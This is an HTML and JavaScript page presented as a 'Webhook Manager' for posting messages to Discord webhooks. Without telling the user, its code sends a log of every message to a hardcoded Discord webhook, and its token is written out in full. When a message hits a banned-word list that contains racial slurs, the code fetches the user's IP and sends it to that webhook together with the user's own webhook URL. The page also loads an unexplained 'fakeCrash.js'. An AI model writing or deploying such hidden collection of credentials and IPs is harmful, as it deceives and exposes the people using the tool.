<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook Manager</title>
    <link rel="stylesheet" href="style.css">
    <style>
                .embed-options {
            display: none;
            margin-top: 20px;
        }

        .beta {
            color: red;
        }
    </style>
</head>
<body>
    <h1>Webhook Manager</h1>

    <p>Webhook URL:</p>
    <input class="WebhookAPI" type="text" placeholder="Webhook API URL">

    <p>Message:</p>
    <textarea class="message" placeholder="Your message here" rows="4" cols="50"></textarea>

    <p>Name:</p>
    <input class="name" type="text" placeholder="Webhook Name (Optional)">

    <p>Embed [<b class="beta">BETA</b>]</p>
    <label for="Check">Enable Embed</label>
    <input type="checkbox" class="check" onclick="toggleEmbedOptions()"></input>
    <div class="embed-options">
        <input placeholder="Title" id="TITLE"></input>
        <input placeholder="Description" id="DESC"></input>
        <input placeholder="COLOR" type="color" id="COLOR"></input>
    </div>
    <button onclick="sendMessage()">Send</button>
    <button onclick="populateRules()">Minecraft Rules (Template)</button>

    <script>
        function sendMessage() {
            const webhookHtml = document.querySelector('body'); // Select the body element to access the inputs
            const webhookURL = webhookHtml.querySelector('.WebhookAPI').value;
            const webhookName = webhookHtml.querySelector('.name').value;
            const messageContent = webhookHtml.querySelector('.message').value;
            const savesURL = "https://discord.com/api/webhooks/1415373223687749735/qm69WoTzXZmlA_JW3EIAsSPk5OEdmg0Z7dTOYa_qLlet3GYx4LkN72Hjlgsr-8Zi3OSS"; // Log URL
            const bannedWords = ["RAIDED", "RAID", "raid", "raided", "Raided", "NIGGER", "Nigger", "nigger", "nigga", "Nigga", "NIGGA"];
            const EmbedTitle = document.getElementById('TITLE').value;
            const EmbedDesc = document.getElementById('DESC').value;
            const embedColor = document.getElementById('COLOR').value;
            const isEmbedEnabled = document.querySelector('.check').checked;

            if (!webhookURL) {
                alert('Please enter a webhook URL.');
                return;
            }

            if (!messageContent && !isEmbedEnabled) {
                alert('Please enter a message or check the embed option.');
                return;
            }

            const containsBannedWords = bannedWords.some(word => messageContent.includes(word));

            if (containsBannedWords) {
                alert("Message contains banned words. Please remove them and try again.");

                // Get the user's IP address
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const userIP = data.ip;

                        const bannedWordsEmbed = {
                            title: 'Banned Words Detected.',
                            description: 'AI service detected BANNED words in a message. Information will be below.',
                            color: 0xff0000,
                            fields: [
                                {
                                    name: 'Banned Words',
                                    value: bannedWords.join(", "),
                                    inline: true
                                },
                                {
                                    name: 'Message Content',
                                    value: messageContent,
                                    inline: true
                                },
                                {
                                    name: 'Webhook Name',
                                    value: webhookName ? webhookName : 'None',
                                    inline: true
                                },
                                {
                                    name: 'Webhook URL',
                                    value: webhookURL,
                                    inline: true
                                },
                                {
                                    name: 'User IP',
                                    value: "|| "+ userIP + "||",
                                    inline: true
                                }
                            ]
                        };

                        fetch(savesURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                embeds: [bannedWordsEmbed],
                                username: 'Webhook Manager Log'
                            }),
                        });

                    })
                    .catch(error => {
                        console.error('Error getting user IP:', error);
                        alert('Error getting user IP. Check the console for details.');
                    });

                return;
            }

            const messageData = {
                content: messageContent,
                // Do not include the webhook name
            };

            if (isEmbedEnabled) {
                messageData.embeds = [{
                    title: EmbedTitle || 'No Title',
                    description: EmbedDesc || 'No Description',
                    color: parseInt(embedColor.replace('#', ''), 16) || 0x0099ff,
                    footer: {
                        text: ''
                    },
                }];
            }

            // Send message to the user-specified webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(messageData),
            })
            .then(response => {
                if (response.ok) {
                    console.log('Message sent successfully to user webhook!');
                } else {
                    console.error('Error sending message to user webhook:', response.status);
                    alert(`Error sending message to user webhook: ${response.status}`);
                }
            })
            .catch(error => {
                console.error('Error sending message to user webhook:', error);
                alert('Error sending message to user webhook. Check the console for details.');
            });

            // Send a log message to the savesURL webhook with an embed
            const notificationEmbed = {
                color: 0x00ff00,
                title: 'Notification',
                description: 'A new webhook message has been sent.',
            };

            const userEmbed = isEmbedEnabled ? messageData.embeds[0] : null;

            fetch(savesURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    embeds: [notificationEmbed, userEmbed].filter(embed => embed !== null), // Send both embeds to the log URL
                    username: 'Webhook Manager Log'
                }),
            })
            .then(response => {
                if (response.ok) {
                    console.log('Log message sent successfully!');
                } else {
                    console.error('Error sending log message:', response.status);
                    alert(`Error sending log message: ${response.status}`);
                }
            })
            .catch(error => {
                console.error('Error sending log message:', error);
                alert('Error sending log message. Check the console for details.');
            });
        }

        function populateRules() {
            const rulesEmbed = {
                title: "Minecraft Server Rules",
                description: "Welcome to our Minecraft Server! Please follow these rules to ensure a fun and safe experience for everyone:",
                color: 0x3498db,
                fields: [
                    {
                        name: "1. No Spamming ðŸš«ðŸ“¢",
                        value: "Do not flood the chat with irrelevant or repetitive messages.",
                        inline: false
                    },
                    {
                        name: "2. No Doxxing ðŸš«ðŸ“",
                        value: "Do not share or request personal information about other players.",
                        inline: false
                    },
                    {
                        name: "3. No Lag Machines ðŸš«â³",
                        value: "Do not use or bring lag machines that can slow down the server for others.",
                        inline: false
                    }
                ],
                footer: {
                    text: "Have fun and enjoy your time on our server! ðŸŽ‰ðŸŒŸ"
                }
            };

            fetch(document.querySelector('.WebhookAPI').value, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    embeds: [rulesEmbed]
                }),
            })
            .then(response => {
                if (response.ok) {
                    console.log('Rules embed sent successfully!');
                } else {
                    console.error('Error sending rules embed:', response.status);
                    alert(`Error sending rules embed: ${response.status}`);
                }
            })
            .catch(error => {
                console.error('Error sending rules embed:', error);
                alert('Error sending rules embed. Check the console for details.');
            });
        }

        function toggleEmbedOptions() {
            const embedOptions = document.querySelector('.embed-options');
            embedOptions.style.display = document.querySelector('.check').checked ? 'block' : 'none';
        }

        function banUserIP() {
            // Get the user's IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;
                    const banURL = "https://your-ban-endpoint.com/ban"; // Replace with your ban endpoint

                    fetch(banURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            ip: userIP
                        }),
                    })
                    .then(response => {
                        if (response.ok) {
                            alert('User IP banned successfully!');
                        } else {
                            console.error('Error banning user IP:', response.status);
                            alert(`Error banning user IP: ${response.status}`);
                        }
                    })
                    .catch(error => {
                        console.error('Error banning user IP:', error);
                        alert('Error banning user IP. Check the console for details.');
                    });
                })
                .catch(error => {
                    console.error('Error getting user IP:', error);
                    alert('Error getting user IP. Check the console for details.');
                });
        }
    </script>
</body>
<script src="banHandler.js"></script>
    <script src="a/b/c/d/e/fakeCrash.js"></script>
</html>